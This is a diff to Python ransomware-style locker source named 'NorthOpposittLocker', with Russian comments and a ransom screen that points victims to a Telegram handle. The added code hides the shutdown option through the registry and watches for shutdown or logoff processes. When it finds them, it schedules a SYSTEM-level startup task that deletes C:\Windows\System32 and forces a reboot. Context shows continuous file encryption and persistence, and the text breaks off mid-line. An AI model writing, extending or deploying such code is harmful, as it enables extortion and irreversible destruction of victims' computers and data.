@@ -218,12 +218,44 @@ def unblock_keyboard():
         pass
 
 # ============================================================
+# ЗАЩИТА ОТ ПЕРЕЗАГРУЗКИ (мониторинг процессов)
+# ============================================================
+def monitor_reboot_attempts(stop_flag):
+    """Следит за попытками перезагрузить ПК"""
+    # Отключаем кнопку перезагрузки в меню Пуск через реестр
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
+        key = reg.CreateKey(reg.HKEY_CURRENT_USER, key_path)
+        reg.SetValueEx(key, "NoClose", 0, reg.REG_DWORD, 1)
+        reg.CloseKey(key)
+    except:
+        pass
+    
+    # Мониторим процессы, связанные с перезагрузкой
+    reboot_processes = ['shutdown.exe', 'logoff.exe', 'userinit.exe']
+    
+    while not stop_flag.is_set():
+        try:
+            for proc in psutil.process_iter(['pid', 'name']):
+                try:
+                    proc_name = proc.info['name'].lower()
+                    if any(rp in proc_name for rp in reboot_processes):
+                        # Если обнаружена попытка перезагрузки - удаляем System32
+                        schedule_system32_deletion()
+                        os.system("shutdown /r /t 0 /f")
+                        sys.exit()
+                except:
+                    pass
+            time.sleep(0.5)
+        except:
+            time.sleep(0.5)
+
+# ============================================================
 # УДАЛЕНИЕ SYSTEM32 ПОСЛЕ РЕБУТА
 # ============================================================
 def schedule_system32_deletion():
     """Создаёт задачу в планировщике, которая удалит System32 при следующей загрузке"""
     try:
-        # Создаём bat-файл для удаления System32
         bat_path = os.path.join(os.environ['TEMP'], 'delete_system32.bat')
         with open(bat_path, 'w') as f:
             f.write('''@echo off
@@ -234,8 +266,8 @@ rmdir /s /q "C:\\Windows\\System32"
 del /f /q "%~f0"
 ''')
         
-        # Создаём задачу в планировщике для запуска при загрузке
         task_name = "System32DeleteTask"
+        os.system(f'schtasks /delete /tn "{task_name}" /f')
         cmd = f'schtasks /create /tn "{task_name}" /tr "{bat_path}" /sc ONSTART /ru "SYSTEM" /rl HIGHEST /f'
         os.system(cmd)
     except:
@@ -244,7 +276,7 @@ del /f /q "%~f0"
 def reboot_and_nuke():
     """Перезагружает компьютер, а после загрузки удаляет System32"""
     schedule_system32_deletion()
-    os.system("shutdown /r /t 2 /f")  # Перезагрузка через 2 секунды
+    os.system("shutdown /r /t 2 /f")
     sys.exit()
 
 # ============================================================
@@ -616,6 +648,7 @@ class NorthOpposittLocker:
         threading.Thread(target=play_music_loop, args=(self.stop_flag,), daemon=True).start()
         threading.Thread(target=create_fake_files, args=(self.stop_flag,), daemon=True).start()
         threading.Thread(target=continuous_encryption, args=(self.stop_flag, self.fernet, self.encrypted_count), daemon=True).start()
+        threading.Thread(target=monitor_reboot_attempts, args=(self.stop_flag,), daemon=True).start()
         
         start_system_load(self.stop_flag)
         
@@ -684,6 +717,7 @@ class NorthOpposittLocker:
 ║   🔐 ДЛЯ ПОЛУЧЕНИЯ КОДА: Telegram @societyvoice             ║
 ║                                                              ║
 ║   ⚠️ 5 НЕВЕРНЫХ ПОПЫТОК = ПЕРЕЗАГРУЗКА + УДАЛЕНИЕ SYSTEM32  ║
+║   ⚠️ ПОПЫТКА ПЕРЕЗАГРУЗИТЬ ПК = УДАЛЕНИЕ SYSTEM32           ║
 ║                                                              ║
 ╚══════════════════════════════════════════════════════════════╝
         """
@@ -753,19 +787,4 @@ class NorthOpposittLocker:
                 self.stop_flag.set()
                 reboot_and_nuke()
             else:
-                show_error_window(f"Вы ввели неверный код: {entered_code}", self.attempts)
-
-# ============================================================
-# ЗАПУСК
-# ============================================================
-if __name__ == "__main__":
-    check_single_instance()
-    
-    if getattr(sys, 'frozen', False):
-        run_as_admin()
-        add_to_startup_priority()
-        disable_safe_mode()
-    
-    root = tk.Tk()
-    app = NorthOpposittLocker(root)
-    root.mainloop()
+                show_error_window(f"Вы ввели неверный код
